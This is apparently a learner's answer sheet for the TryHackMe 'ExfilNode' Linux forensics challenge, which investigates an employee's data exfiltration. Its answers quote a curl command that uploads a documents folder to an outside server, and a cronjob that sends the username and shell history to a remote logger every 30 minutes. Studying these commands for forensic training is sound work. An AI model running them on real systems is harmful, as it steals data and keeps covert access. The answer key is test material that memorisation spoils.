---
Date: 2025-09-23
Tags: #TryHackMe
Hubs: "TryHackMe/Advanced Endpoint Investigations/Disk Image Analysis"
URLs: (https://tryhackme.com/room/exfilnode)
id: 040d3756-a7c9-4760-bea6-20cf2e75222e
---

# TryHackMe | ExfilNode

## Task 1 | The End

Room Prerequisites 
- [Linux Forensics ](https://tryhackme.com/room/linuxforensics)
- [Linux Incident Surface ](https://tryhackme.com/room/linuxincidentsurface)
- [Linux Logs Investigations ](https://tryhackme.com/room/linuxlogsinvestigations)
- [EXT Analysis ](https://tryhackme.com/room/extanalysis)

 **Note:**  Before we continue to dive into the scenario, it is important to note that this challenge is the continuation of the [DiskFiltration ](https://tryhackme.com/room/diskfiltration) room, where Liam's company-provided machine was being investigated in a data exfiltration case. While it is recommended to go through that room first to get a better understanding of the story's context, it's not mandatory. You can also solve this room independently and test your Linux investigation skills.

 Scenario The analysis of Liam's company-provided Windows workstation in the DiskFiltration room revealed major evidence of his involvement in the TECH THM's data exfiltration. However, he could argue that he was framed as he did not own the workstation. So, to uncover the whole truth and gather all the possible undeniable evidence, the investigators turned their attention to Liam's personal workstation (Linux machine), which was suspected to have played a key role in handling the exfiltrated data.

 As this was Liam's personal workstation, he had full control over covering his tracks more effectively. But was he careful enough? It seems like the investigators not only revealed more about the external entity Liam worked with but also exposed a betrayal: Liam was double-crossed.

 Starting the Machine Let’s start the virtual machine by pressing the **Start Machine**  button below. The machine will start in split view.

 Start Machine In case the VM is not visible, use the blue **Show Split View**  button at the top of the page.

 Liam's personal workstation's disk is mounted at `/mnt/liam_disk`, and the disk image is available at `/home/ubuntu`. You can run commands on the mounted disk.

 **Note:**  If you get the error `grep: /mnt/liam_disk/var/log/auth.log: binary file matches` with any log file, use `grep -a` which will treat the file as text. An example is given below:

 `grep -i -a "string-pattern" /mnt/liam_disk/var/log/auth.log
  `

 Additionally, you can utilize the Autopsy tool to assist with the analysis. However, Autopsy is optional. All the questions in this room can be answered by running commands on the mounted disk.

 To use Autopsy, open a terminal and navigate to `/home/ubuntu/autopsy/autopsy-4.21.0/bin` and execute the command `./autopsy --nosplash` to execute it. The GUI of the tool will open. Now, select `Open Recent Case` from here and open the recent case named `Liam_Personal_Workstation` in which we have already imported the disk image.

### **Answer the questions below**

**Question:** When did Liam last logged into the system? (Format: YYYY-MM-DD HH:MM:SS)

*Answer:* 

     2025-02-28 10:59:07

**Question:** What was the timezone of Liam’s device?

*Answer:* 

     America/Toronto

**Question:** What is the serial number of the USB that was inserted by Liam?

*Answer:* 

     2651931097993496666

**Question:** When was the USB connected to the system? (Format: YYYY-MM-DD HH:MM:SS)

*Answer:* 

     2025-02-28 10:59:25

**Question:** What command was executed when Liam ran 'transferfiles'?

*Answer:* 

     cp -r \"/media/liam/46E8E28DE8E27A97/Critical Data TECH THM\" /home/liam/Documents/Data

**Question:** What command did Liam execute to transfer the exfiltrated files to an external server?

*Answer:* 

     curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload

**Question:** What is the IP address of the domain to which Liam transferred the files to?

*Answer:* 

     5.45.102.93

**Question:** Which directory was the user in when they created the file 'mth'?

*Answer:* 

     /home/liam

**Question:** Remember Henry, the external entity helping Liam during the exfiltration? What was the amount in USD that Henry had to give Liam for this exfiltration task?

*Answer:* 

     10000

**Question:** When was the USB disconnected by Liam? (Format: YYYY-MM-DD HH:MM:SS)

*Answer:* 

     2025-02-28 11:44:00

**Question:** There is a .hidden/ folder that Liam listed the contents of in his commands. What is the full path of this directory?

*Answer:* 

     /home/liam/Public

**Question:** Which files are likely timstomped in this .hidden/ directory (answer in alphabetical order, ascending, separated by a comma. e.g example1.txt,example2.txt)

*Answer:* 

     file3.txt,file7.txt

**Question:** Liam thought the work was done, but the external entity had other plans. Which IP address was connected via SSH to Liam's machine a few hours after the exfiltration?

*Answer:* 

     94.102.51.15

**Question:** Which cronjob did the external entity set up inside Liam’s machine?

*Answer:* 

     */30 * * * * curl -s -X POST -d "$(whoami):$(tail -n 5 ~/.bash_history)" http://192.168.1.23/logger.php

---

